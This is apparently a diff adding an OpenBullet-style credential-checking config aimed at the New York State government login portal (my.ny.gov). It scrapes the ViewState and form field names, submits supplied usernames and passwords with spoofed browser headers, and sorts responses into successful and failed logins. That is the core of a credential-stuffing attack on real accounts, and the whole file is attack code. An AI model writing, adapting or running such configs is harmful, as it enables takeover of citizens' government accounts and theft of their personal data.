@@ -1,0 +1,131 @@
+BLOCK:HttpRequest
+LABEL:GetLoginPage
+  url = "https://my.ny.gov/LoginV4/login.xhtml"
+  customHeaders = {("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"), ("accept-language", "en-US,en;q=0.9"), ("accept-encoding", "gzip, deflate, br"), ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"), ("upgrade-insecure-requests", "1")}
+  TYPE:STANDARD
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractViewState
+  input = @data.SOURCE
+  leftDelim = "name=\"javax.faces.ViewState\" value=\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @ViewState
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractViewStateAlt
+  input = @data.SOURCE
+  leftDelim = "id=\"javax.faces.ViewState\" value=\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @ViewState
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractFormId
+  input = @data.SOURCE
+  leftDelim = "<form"
+  rightDelim = ">"
+  MODE:LR
+  => VAR @FormTag
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractFormIdFromTag
+  input = @FormTag
+  leftDelim = "id=\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @FormId
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractUsernameFieldName
+  input = @data.SOURCE
+  leftDelim = "type=\"text\""
+  rightDelim = ">"
+  MODE:LR
+  => VAR @UsernameFieldTag
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractUsernameFieldNameFromTag
+  input = @UsernameFieldTag
+  leftDelim = "name=\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @UsernameFieldName
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractPasswordFieldName
+  input = @data.SOURCE
+  leftDelim = "type=\"password\""
+  rightDelim = ">"
+  MODE:LR
+  => VAR @PasswordFieldTag
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractPasswordFieldNameFromTag
+  input = @PasswordFieldTag
+  leftDelim = "name=\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @PasswordFieldName
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractLoginButtonName
+  input = @data.SOURCE
+  leftDelim = "type=\"submit\""
+  rightDelim = ">"
+  MODE:LR
+  => VAR @LoginButtonTag
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:ExtractLoginButtonNameFromTag
+  input = @LoginButtonTag
+  leftDelim = "name=\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @LoginButtonName
+ENDBLOCK
+
+BLOCK:HttpRequest
+LABEL:Login
+  url = "https://my.ny.gov/LoginV4/login.xhtml"
+  method = POST
+  customHeaders = {("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"), ("accept-language", "en-US,en;q=0.9"), ("accept-encoding", "gzip, deflate, br"), ("content-type", "application/x-www-form-urlencoded; charset=UTF-8"), ("origin", "https://my.ny.gov"), ("referer", "https://my.ny.gov/LoginV4/login.xhtml"), ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"), ("x-requested-with", "XMLHttpRequest"), ("upgrade-insecure-requests", "1")}
+  TYPE:STANDARD
+  $"javax.faces.ViewState=@ViewState&@UsernameFieldName=@input.USER&@PasswordFieldName=@input.PASS&@LoginButtonName=Login"
+  "application/x-www-form-urlencoded"
+ENDBLOCK
+
+BLOCK:Keycheck
+  KEYCHAIN FAIL OR
+    STRINGKEY @data.SOURCE Contains "Invalid username or password"
+    STRINGKEY @data.SOURCE Contains "Login failed"
+    STRINGKEY @data.SOURCE Contains "Authentication failed"
+    STRINGKEY @data.SOURCE Contains "error"
+    STRINGKEY @data.SOURCE Contains "Error"
+    STRINGKEY @data.SOURCE Contains "Invalid credentials"
+    STRINGKEY @data.SOURCE Contains "Account locked"
+    STRINGKEY @data.SOURCE Contains "Account disabled"
+    STRINGKEY @data.RESPONSECODE Contains "401"
+    STRINGKEY @data.RESPONSECODE Contains "403"
+    STRINGKEY @data.RESPONSECODE Contains "400"
+  KEYCHAIN SUCCESS OR
+    STRINGKEY @data.SOURCE Contains "Welcome"
+    STRINGKEY @data.SOURCE Contains "Dashboard"
+    STRINGKEY @data.SOURCE Contains "My Account"
+    STRINGKEY @data.SOURCE Contains "Logout"
+    STRINGKEY @data.HEADERS["Location"] Contains "/home"
+    STRINGKEY @data.HEADERS["Location"] Contains "/dashboard"
+    STRINGKEY @data.HEADERS["Location"] Contains "/account"
+    STRINGKEY @data.RESPONSECODE Contains "200"
+    STRINGKEY @data.RESPONSECODE Contains "302"
+ENDBLOCK
